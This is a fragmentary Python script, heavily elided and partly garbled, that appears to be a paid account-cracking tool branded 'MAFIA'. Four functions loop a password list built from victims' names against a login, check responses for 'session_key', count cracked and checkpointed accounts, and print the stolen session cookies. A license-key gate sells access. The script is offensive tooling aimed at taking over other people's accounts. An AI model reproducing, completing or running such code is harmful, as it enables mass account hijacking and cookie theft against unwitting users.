...
def M1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write(f'\r\r\033[1;37m<[MAFIA-M1]>Ã<[%s| \033[1;32mOK\033[1;37m|\033[1;34mCP \033[1;32m%s\033[1;37m|\033[1;34m%s\033[1;37m]> '%(loop,len(oks),len(cps)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        #------[OK IDS]------#
                                        #print("\033[1;33m <[BISCUT-ðª]> :\033[1;33m "+cookie)                                                   
...
def M2(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write(f'\r\r\033[1;37m<[MAFIA-M2]>Ã<[%s| \033[1;32mOK\033[1;37m|\033[1;34mCP \033[1;32m%s\033[1;37m|\033[1;34m%s\033[1;37m]> '%(loop,len(oks),len(cps)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
...
#os.system("espeak -a 300 \"MAFIA,  OK,  YOUCEF,  THANKS,  \"") 
                                        print("\033[1;34m <[BISCUT-ðª]> :\033[1;37m "+cookie)           
...
def M3(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write(f'\r\r\033[1;37m<[MAFIA-M3]>Ã<[%s| \033[1;32mOK\033[1;37m|\033[1;34mCP \033[1;32m%s\033[1;37m|\033[1;34m%s\033[1;37m]> '%(loop,len(oks),len(cps)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
...
def M4(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write(f'\r\r\033[1;37m<[MAFIA-M4]>Ã<[%s| \033[1;32mOK\033[1;37m|\033[1;34mCP \033[1;32m%s\033[1;37m|\033[1;34m%s\033[1;37m]> '%(loop,len(oks),len(cps)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
...
def main_apv():
    ...
    print('\033[1;34mâââââââââââââââââââââââââââââââââââââââââ')
    try:
        ...
        if Xyteee in system:
            ...
            print(f"\033[1;32m[\033[1;31m-\033[1;32m] \033[1;37mTHIS IS PAID TOOL [ð¸]")
            print(f"\033[1;32m[\033[1;31m-\033[1;32m] \033[1;37mSEND YOUR KEY ADMIN [ð¸]")
            print('\033[1;34mâââââââââââââââââââââââââââââââââââââââââ\033[1;97m')
